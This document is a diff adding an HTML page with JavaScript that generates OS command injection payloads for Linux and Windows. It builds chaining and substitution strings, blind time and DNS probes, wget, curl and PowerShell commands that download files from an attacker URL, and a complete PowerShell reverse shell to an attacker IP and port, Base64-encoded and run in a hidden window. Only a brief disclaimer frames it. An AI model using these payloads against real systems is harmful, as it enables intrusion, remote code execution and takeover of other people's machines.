@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CMD Injection Payload Generator</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 2rem auto;
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #d9534f;
+            text-align: center;
+            margin-bottom: 1.5rem;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 0.75rem;
+        }
+        .disclaimer {
+            background-color: #fcf8e3;
+            padding: 1rem;
+            border-left: 5px solid #f0ad4e;
+            margin-bottom: 1.5rem;
+            font-size: 0.9em;
+            border-radius: 4px;
+        }
+        .disclaimer strong {
+            color: #c9302c;
+        }
+        .form-section {
+            margin-bottom: 1.5rem;
+            border: 1px solid #ddd;
+            padding: 1.5rem;
+            border-radius: 8px;
+        }
+        .form-grid-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        .form-grid-container > div {
+            flex: 1 1 100%;
+        }
+        @media (min-width: 768px) { /* md breakpoint */
+            .form-grid-container > div {
+                flex: 1 1 calc(50% - 0.5rem);
+            }
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+            color: #555;
+        }
+        select, input[type="text"], textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 1rem;
+            margin-bottom: 0.75rem;
+            background-color: white;
+            color: #333;
+            transition: border-color 0.2s ease-in-out;
+        }
+        select:focus, input[type="text"]:focus, textarea:focus {
+             border-color: #0275d8;
+             outline: none;
+        }
+        button {
+            border: none;
+            padding: 0.75rem 1.25rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 500;
+            margin-top: 0.5rem;
+            transition: background-color 0.3s;
+            color: white;
+        }
+        button#generate-btn {    
+            background-color: #d9534f;
+        }
+        button#generate-btn:hover {
+            background-color: #c9302c;
+        }
+        button#copy-btn {    
+            background-color: #5cb85c;
+        }
+        button#copy-btn:hover {
+            background-color: #4cae4c;
+        }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            margin-top: 2rem;
+        }
+        .button-container button {
+            width: 100%;
+            margin-bottom: 0.5rem;
+        }
+        .button-container button:last-child {
+            margin-bottom: 0;
+        }
+        @media (min-width: 640px) { /* sm breakpoint */
+            .button-container {
+                flex-direction: row;
+                align-items: center;
+            }
+            .button-container button {
+                width: auto;
+                margin-bottom: 0;
+                margin-right: 1rem;
+            }
+            .button-container button:last-child {
+                margin-right: 0;
+            }
+        }
+        #result-payload {
+            padding: 1rem;
+            min-height: 100px;
+            word-wrap: break-word;
+            font-family: 'Consolas', 'Monaco', monospace;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+            border-radius: 4px;
+            background-color: #f8f9fa;
+            border: 1px solid #ddd;
+            color: #333;
+        }
+        .payload-options-group { /* Renamed from custom-payload-input for generality */
+            display: none;    
+            margin-top: 0.75rem;
+            padding: 1rem;
+            background-color: #f9f9f9;
+            border: 1px solid #eee;
+            border-radius: 4px;
+        }
+        #result-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+            color: #555;
+        }
+        #result-container {
+            margin-top: 2rem;
+        }
+        .note {
+            font-size: 0.85em;
+            color: #666;
+            margin-top: 0.25rem;
+            display: block;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CMD Injection Payload Generator</h1>
+
+        <div class="disclaimer">
+            <strong>Ethical Use Disclaimer:</strong> This tool is for <strong>educational purposes and authorized security research only</strong>. Unauthorized command execution on systems is illegal and unethical. Always obtain explicit permission before conducting any security assessments.
+        </div>
+
+        <div class="form-section">
+            <div class="form-grid-container"> 
+                <div>
+                    <label for="base-command">Base Command/Input (e.g., <code>ping</code>, <code>filename</code>, <code>127.0.0.1</code>):</label>
+                    <input type="text" id="base-command" placeholder="e.g., 127.0.0.1 or some_file.txt">
+                </div>
+                <div>
+                    <label for="target-os">Target Operating System:</label>
+                    <select id="target-os">
+                        <option value="linux">Linux/Unix-like</option>
+                        <option value="windows">Windows</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+        
+        <div class="form-section">
+            <h2 style="font-size: 1.1em; color: #333; margin-bottom: 1rem; border-bottom: 1px solid #eee; padding-bottom: 0.5rem;">Optional: Network Details (for Reverse Shells, Exfil, Downloads)</h2>
+            <div class="form-grid-container">
+                <div>
+                    <label for="attacker-ip">Attacker IP Address:</label>
+                    <input type="text" id="attacker-ip" placeholder="e.g., 10.0.0.1 (optional)">
+                </div>
+                <div>
+                    <label for="attacker-port">Attacker Port:</label>
+                    <input type="text" id="attacker-port" placeholder="e.g., 4444 (optional)">
+                </div>
+            </div>
+             <span class="note">Leave blank to use placeholders like YOUR_ATTACKER_IP.</span>
+        </div>
+
+
+        <div class="form-section">
+            <label for="cmd-payload-type">Select CMD Injection Payload Type:</label>
+            <select id="cmd-payload-type">
+                <option value="">-- Select Type --</option>
+                <option value="chain_semicolon">Command Chaining (Semicolon ;)</option>
+                <option value="chain_and">Command Chaining (Logical AND &&)</option>
+                <option value="chain_or">Command Chaining (Logical OR ||)</option>
+                <option value="chain_pipe">Command Chaining (Pipe |)</option>
+                <option value="chain_newline">Command Chaining (Newline %0a)</option>
+                <option value="sub_backticks">Command Substitution (Backticks `` - Unix)</option>
+                <option value="sub_dollar_paren">Command Substitution ($() - Unix)</option>
+                <option value="out_redirect">Output Redirection (> file)</option>
+                <option value="blind_time">Blind - Time-based (sleep/timeout)</option>
+                <option value="blind_dns">Blind - DNS-based (nslookup/ping to YOUR_COLLAB_SERVER.com)</option>
+                <option value="file_download">File Download (URL to Local Path)</option>
+                <option value="rev_shell_ps_b64">Reverse Shell - PowerShell Base64 (Windows)</option>
+                <option value="custom_cmd">Custom CMD Payload</option>
+            </select>
+
+            <div id="custom-cmd-payload-div" class="payload-options-group">
+                <label for="custom-cmd-payload-text">Enter Custom CMD Payload (will be appended):</label>
+                <textarea id="custom-cmd-payload-text" rows="3" placeholder="e.g., ; whoami"></textarea>
+            </div>
+
+            <div id="file-download-options-div" class="payload-options-group">
+                <div>
+                    <label for="remote-file-url">Remote File URL:</label>
+                    <input type="text" id="remote-file-url" placeholder="e.g., http://example.com/file.txt or http://ATTACKER_IP/file.exe">
+                </div>
+                <div>
+                    <label for="local-save-path">Local Save Path (on target):</label>
+                    <input type="text" id="local-save-path" placeholder="e.g., /tmp/downloaded_file or C:\Windows\Temp\file.exe">
+                </div>
+            </div>
+        </div>
+
+        <div class="button-container"> 
+            <button id="generate-btn">Generate Payload</button>
+            <button id="copy-btn">Copy to Clipboard</button>
+        </div>
+
+        <div id="result-container">
+            <label id="result-label" for="result-payload">Generated Payload:</label>
+            <div id="result-payload">Select a payload type and click "Generate Payload".</div>
+        </div>
+        
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log("DOM fully loaded. CMD Injection Script Initializing (Classic Theme - Advanced)...");
+
+            // DOM Elements
+            const baseCommandInput = document.getElementById('base-command');
+            const targetOsSelect = document.getElementById('target-os');
+            const attackerIpInput = document.getElementById('attacker-ip');
+            const attackerPortInput = document.getElementById('attacker-port');
+            const cmdPayloadTypeSelect = document.getElementById('cmd-payload-type');
+            const generateBtn = document.getElementById('generate-btn');
+            const copyBtn = document.getElementById('copy-btn');
+            const resultPayloadDiv = document.getElementById('result-payload');
+            
+            const customCmdPayloadDiv = document.getElementById('custom-cmd-payload-div');
+            const customCmdPayloadText = document.getElementById('custom-cmd-payload-text');
+            
+            const fileDownloadOptionsDiv = document.getElementById('file-download-options-div');
+            const remoteFileUrlInput = document.getElementById('remote-file-url');
+            const localSavePathInput = document.getElementById('local-save-path');
+            
+            // Sanity checks
+            if (!baseCommandInput || !targetOsSelect || !attackerIpInput || !attackerPortInput || !cmdPayloadTypeSelect || 
+                !generateBtn || !copyBtn || !resultPayloadDiv || !customCmdPayloadDiv || !customCmdPayloadText ||
+                !fileDownloadOptionsDiv || !remoteFileUrlInput || !localSavePathInput) {
+                console.error("CMD Gen: One or more critical DOM elements are missing!");
+                if(resultPayloadDiv) resultPayloadDiv.textContent = "Error: Page elements missing. Check console.";
+                return;
+            }
+
+            // Event Listeners for payload generator
+            cmdPayloadTypeSelect.addEventListener('change', function() {
+                customCmdPayloadDiv.style.display = (this.value === 'custom_cmd') ? 'block' : 'none';
+                fileDownloadOptionsDiv.style.display = (this.value === 'file_download') ? 'block' : 'none';
+            });
+            
+            generateBtn.addEventListener('click', generateFullPayload);
+            copyBtn.addEventListener('click', copyGeneratedPayload);
+
+            // --- Payload Generation Logic ---
+            function generateFullPayload() {
+                console.log("CMD Gen: Generate button clicked.");
+                
+                const baseCmd = baseCommandInput.value.trim();
+                const os = targetOsSelect.value;
+                const payloadType = cmdPayloadTypeSelect.value;
+                let injectionPayload = "";
+
+                // Get attacker IP and Port, use placeholders if empty
+                const attackerIp = attackerIpInput.value.trim() || "YOUR_ATTACKER_IP";
+                const attackerPort = attackerPortInput.value.trim() || "YOUR_ATTACKER_PORT";
+
+
+                if (!payloadType) {
+                    if(resultPayloadDiv) resultPayloadDiv.textContent = 'Please select a CMD payload type.';
+                    return;
+                }
+                
+                injectionPayload = generateCmdInjectionPayload(payloadType, os, attackerIp, attackerPort);
+
+                if (payloadType === 'custom_cmd') {
+                    if(resultPayloadDiv) resultPayloadDiv.textContent = baseCmd + (customCmdPayloadText.value.trim());
+                } else {
+                    if(resultPayloadDiv) resultPayloadDiv.textContent = baseCmd + injectionPayload;
+                }
+                console.log("CMD Gen: Final payload:", resultPayloadDiv ? resultPayloadDiv.textContent : "resultPayloadDiv not found");
+            }
+
+            function generateCmdInjectionPayload(type, os, attackerIp, attackerPort) {
+                console.log("CMD Gen: Generating injection for type:", type, "OS:", os, "IP:", attackerIp, "Port:", attackerPort);
+                const evilServer = "YOUR_COLLAB_SERVER.com"; // Placeholder for DNS exfil (can be attackerIp if DNS server is there)
+                let payload = "";
+                const sh_i = (os === 'linux') ? '/bin/sh -i' : 'cmd.exe';
+
+
+                switch (type) {
+                    case 'chain_semicolon':
+                        payload = (os === 'windows' ? " & " : "; ") + (os === 'windows' ? "dir" : "ls -la");
+                        break;
+                    case 'chain_and':
+                        payload = (os === 'windows' ? " && " : " && ") + (os === 'windows' ? "echo SUCCESS" : "echo SUCCESS");
+                        break;
+                    case 'chain_or':
+                        payload = (os === 'windows' ? " || " : " || ") + (os === 'windows' ? "echo FAILED_PREV" : "echo FAILED_PREV");
+                        break;
+                    case 'chain_pipe':
+                        payload = (os === 'windows' ? " | " : " | ") + (os === 'windows' ? "findstr ." : "grep .");
+                        break;
+                    case 'chain_newline':    
+                        payload = "%0a" + (os === 'windows' ? "whoami" : "id");
+                        break;
+                    case 'sub_backticks':
+                        payload = (os === 'linux') ? " `id`" : " (Not directly applicable for Windows CMD, use PowerShell `whoami`)";
+                        break;
+                    case 'sub_dollar_paren':
+                        payload = (os === 'linux') ? " $(id)" : " (Not directly applicable for Windows CMD, use PowerShell $(whoami))";
+                        break;
+                    case 'out_redirect':
+                        payload = (os === 'windows' ? " > C:\\windows\\temp\\output.txt" : " > /tmp/output.txt") + (os === 'windows' ? " & type C:\\windows\\temp\\output.txt" : "; cat /tmp/output.txt");
+                        break;
+                    case 'blind_time':
+                        payload = (os === 'windows' ? " & timeout /t 5 /nobreak > nul" : "; sleep 5");
+                        break;
+                    case 'blind_dns':
+                        const dnsHost = evilServer; // Or use attackerIp if it's set up for DNS exfil
+                        const dnsPayloadCmd = (os === 'windows' ? `ping -n 1 ${dnsHost}` : `ping -c 1 ${dnsHost}`);
+                        payload = (os === 'windows' ? " & " : "; ") + dnsPayloadCmd;
+                        break;
+                    case 'file_download':
+                        const remoteUrl = remoteFileUrlInput.value.trim();
+                        const localPath = localSavePathInput.value.trim();
+                        if (!remoteUrl || !localPath) {
+                            payload = " (Error: Remote URL and Local Path are required for file download)";
+                            alert("Remote URL and Local Save Path are required for File Download.");
+                            break;
+                        }
+                        if (os === 'linux') {
+                            payload = `; wget "${remoteUrl}" -O "${localPath}" || curl -o "${localPath}" -L "${remoteUrl}"`;
+                        } else { // windows
+                            payload = ` & powershell -c "(New-Object System.Net.WebClient).DownloadFile('${remoteUrl.replace(/'/g, "''")}', '${localPath.replace(/'/g, "''")}')"`;
+                            // Alternative for older windows or if powershell is restricted:
+                            // payload = ` & certutil.exe -urlcache -split -f "${remoteUrl}" "${localPath}"`;
+                        }
+                        break;
+                    case 'rev_shell_ps_b64':
+                        if (os === 'windows') {
+                            const psScript = `$client = New-Object System.Net.Sockets.TCPClient("${attackerIp}",${attackerPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+                            const encodedScript = btoa(psScript); // Simple Base64 encoding
+                            payload = ` & powershell.exe -NoP -NonI -W Hidden -Enc ${encodedScript}`;
+                        } else {
+                            payload = " (Error: PowerShell Base64 Reverse Shell is for Windows only)";
+                        }
+                        break;
+                    case 'custom_cmd':
+                        payload = ""; // Handled by customCmdPayloadText directly
+                        break;
+                    default:
+                        payload = ' Invalid CMD payload type.';
+                }
+                console.log("CMD Gen: Generated injection part:", payload);
+                return payload;
+            }
+
+            // --- Utility Functions ---
+            function copyGeneratedPayload() {
+                // ... (copy logic remains the same as your provided version)
+                console.log("CMD Gen: Copy button clicked.");
+                if (!resultPayloadDiv) {    
+                    console.error("CMD Gen: resultPayloadDiv is null in copyGeneratedPayload.");
+                    return;
+                }
+                const payloadText = resultPayloadDiv.textContent;
+                if (payloadText && !payloadText.startsWith('Please select') && !payloadText.startsWith('Invalid') && payloadText.trim() !== "" && !payloadText.startsWith('Error:')) {
+                    navigator.clipboard.writeText(payloadText)
+                        .then(() => {
+                            console.log("CMD Gen: Payload copied.");
+                            const originalText = copyBtn.textContent;
+                            copyBtn.textContent = 'Copied!';
+                            copyBtn.style.backgroundColor = '#28a745'; 
+                            setTimeout(() => {
+                                copyBtn.textContent = originalText;
+                                copyBtn.style.backgroundColor = ''; 
+                            }, 2000);
+                        })
+                        .catch(err => {
+                            console.error('CMD Gen: Failed to copy payload: ', err);
+                            if(resultPayloadDiv) resultPayloadDiv.textContent = 'Failed to copy. Check console (HTTPS/localhost needed).';
+                            const originalText = copyBtn.textContent;
+                            copyBtn.textContent = 'Copy Failed!';
+                             copyBtn.style.backgroundColor = '#dc3545'; 
+                             setTimeout(() => {
+                                copyBtn.textContent = originalText;
+                                copyBtn.style.backgroundColor = ''; 
+                            }, 2500);
+                        });
+                } else {
+                     console.log("CMD Gen: Nothing valid to copy.");
+                     const originalText = copyBtn.textContent;
+                     copyBtn.textContent = 'Nothing to copy!';
+                     copyBtn.style.backgroundColor = '#ffc107'; 
+                     setTimeout(() => {
+                        copyBtn.textContent = originalText;
+                        copyBtn.style.backgroundColor = ''; 
+                    }, 2000);
+                }
+            }
+
+            // Initial state
+            if (resultPayloadDiv) {    
+                resultPayloadDiv.textContent = 'Select a payload type and click "Generate Payload".';
+            }
+            customCmdPayloadDiv.style.display = 'none';
+            fileDownloadOptionsDiv.style.display = 'none';
+            console.log("CMD Gen: Script initialization complete (Classic Theme - Advanced).");
+        });
+    </script>
+</body>
+</html>
